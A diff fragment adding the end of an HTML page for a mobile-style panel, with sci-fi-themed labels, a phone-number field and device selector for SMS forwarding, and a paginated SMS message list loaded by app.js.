+            <div class="sheet-section">
+                <h3>Quantum Relay Conduit 📡</h3>
+                <input type="tel" id="sheetFwdPhone" class="mobile-input" placeholder="Relay destination phone">
+                <select id="sheetSenderDevice" class="mobile-select">
+                    <option value="">Conduit Probe Vessel</option>
+                </select>
+                <div class="sheet-row">
+                    <button class="action-btn action-primary" id="sheetFwdBtn" onclick="toggleForward()" style="flex:1">Start Quantum Relay</button>
+                </div>
+                <div class="fwd-status" id="sheetFwdStatus"></div>
+            </div>
+
+            <!-- Transmission Archive for this Node -->
+            <div class="sheet-section">
+                <div class="section-header-row">
+                    <h3>Node Transmissions Feed 📨</h3>
+                    <div style="display:flex; gap:8px; align-items:center;">
+                        <button class="action-btn action-primary" style="padding:6px 12px; font-size:0.75rem; min-height:34px;" onclick="refreshSheetSms()">Refresh Stream</button>
+                        <span class="badge" id="sheetSmsCount">0</span>
+                    </div>
+                </div>
+                <div class="sheet-sms-list" id="sheetSmsList"></div>
+                <div class="pagination" id="sheetPagination" style="display:none;">
+                    <button class="page-btn" id="sheetSmsPrev" onclick="sheetPrevPage()" disabled>‹</button>
+                    <span class="page-info" id="sheetPageInfo">1 / 1</span>
+                    <button class="page-btn" id="sheetSmsNext" onclick="sheetNextPage()" disabled>›</button>
+                </div>
+                <div class="detail-card detail-card-inline" id="sheetSmsDetail" style="display:none;">
+                    <div class="detail-card-body" id="sheetSmsDetailBody"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden compatibility elements to guarantee 100% selector stability -->
+    <div style="display:none !important;">
+        <input type="checkbox" id="showMutedSms">
+        <textarea id="messageBody"></textarea>
+    </div>
+
+    <!-- Toast Notification Container -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script src="app.js"></script>
+</body>
+</html>
+
+
